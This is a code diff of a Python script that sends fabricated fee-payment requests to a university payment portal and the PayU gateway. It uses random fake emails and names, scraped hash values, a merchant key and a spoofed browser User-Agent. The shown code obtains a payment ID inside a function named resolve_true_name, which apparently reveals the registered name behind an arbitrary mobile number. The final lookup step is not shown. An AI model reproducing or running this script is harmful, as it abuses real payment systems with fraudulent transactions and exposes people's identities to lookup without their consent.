@@ -8,7 +8,7 @@ import json
 DOMAINS = ["example.com", "gmail.com", "yahoo.com", "hotmail.com"]
 HEADERS = {
     "Accept-Language": "en-GB,en;q=0.9",
-    "Accept-Encoding": "gzip, deflate, br"
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
 }
 
 def _rand4():
@@ -36,20 +36,46 @@ def get_hash_value(html_content):
 
 # Send GET request to the payment page and extract the hash value
 def _get_hash(mobileno, random_email, random4letter):
-    url = f"https://dbatu.unisuite.in/PaymentGatway/PaymentGateway/MakePayment?merchantTxnID=FSTKN74522154{mobileno}&orderAmount=1830&MobielNo={mobileno}&EmailID={random_email}&firstName={random4letter}%20rathod&Description=Affiliated%20University%20Fees%20For%20First%20Year%20%20A.Y.2024-25%20%28PG%20Programme%29%20%5BPRN%2098989898%5D%20%5Bbfarm%5D&requestNumber=FSTKN0000309048300&isNeftChallanFromPG=False&payExpiry=01%2F01%2F0001%2000%3A00%3A00&IsPayExpiry=False&PGiD=4"
-    response = requests.get(url, headers=HEADERS)
-    return get_hash_value(response.text)
+    url = (
+        f"https://dbatu.unisuite.in/PaymentGatway/PaymentGateway/MakePayment"
+        f"?merchantTxnID=FSTKN970958575283250001"
+        f"&orderAmount=354"
+        f"&MobielNo={mobileno}"
+        f"&EmailID={random_email}"
+        f"&firstName={random4letter}%20Rao"
+        f"&Description=Payment%20Towards%20Application%20Form%20Fees%20For%20Regular%20Statutory%20Positions%20%3A%20Reserved%20Catagory%20%20%5B{random4letter}%20Rao%5D"
+        f"&requestNumber=FSTKN0004066153134"
+        f"&isNeftChallanFromPG=False"
+        f"&payExpiry=01%2F01%2F0001%2000%3A00%3A00"
+        f"&IsPayExpiry=False"
+        f"&PGiD=4"
+    )
+    response = requests.get(url, headers=HEADERS, timeout=15)
+    soup = __import__('bs4').BeautifulSoup(response.text, 'html.parser')
+
+    def _field(name):
+        tag = soup.find('input', {'name': name})
+        return tag['value'] if tag else None
+
+    hash_val      = _field('hash')
+    actual_email  = _field('email')      or random_email
+    actual_fname  = _field('firstname')  or (random4letter + ' Rao')
+    actual_phone  = _field('phone')      or mobileno
+    return hash_val, actual_email, actual_fname, actual_phone
 
 
-def _get_pid(mobileno, random_email, hash_value, random4letter):
+def _get_pid(mobileno, email, hash_value, firstname):
     burp0_url = "https://secure.payu.in:443/_payment"
     burp0_data = {
         "pgEnquiryBy": "2", "drop_category": "NEFTRTGS", "udf1": '', "udf2": '', "udf3": '',
-        "udf4": '', "udf5": '', "hash": hash_value, "txnid": "FSTKN74522154"+mobileno, "amount": "1830",
-        "phone": mobileno, "email": random_email, "surl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
+        "udf4": '', "udf5": '', "hash": hash_value, "txnid": "FSTKN970958575283250001", "amount": "354",
+        "phone": mobileno, "email": email,
+        "surl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
         "curl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
-        "furl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse", "firstname": random4letter + " rathod",
-        "productinfo": "Affiliated University Fees For First Year  AY202", "key": "Xp7re3"
+        "furl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
+        "firstname": firstname,
+        "productinfo": "Payment Towards Application Form Fees For Regular ",
+        "key": "Xp7re3"
     }
     response = requests.post(burp0_url, headers=HEADERS, data=burp0_data, allow_redirects=False)
     location = response.headers.get('Location')
@@ -67,16 +93,15 @@ def resolve_true_name(mobile: str):
     """
     Returns: (verified_name | None, error | None)
     """
-    mobile = mobile
     random_mobileno = str(_rand_mobile())
     random_email = _rand_email()
     random4letter = _rand4()
     try:
-        hash_val = _get_hash(random_mobileno, random_email, random4letter)
+        hash_val, actual_email, actual_firstname, actual_phone = _get_hash(random_mobileno, random_email, random4letter)
         if not hash_val:
             return None, "hash_not_found"
 
-        pid = _get_pid(random_mobileno, random_email, hash_val, random4letter)
+        pid = _get_pid(actual_phone, actual_email, hash_val, actual_firstname)
         if not pid:
             return None, "payment_id_failed"
 
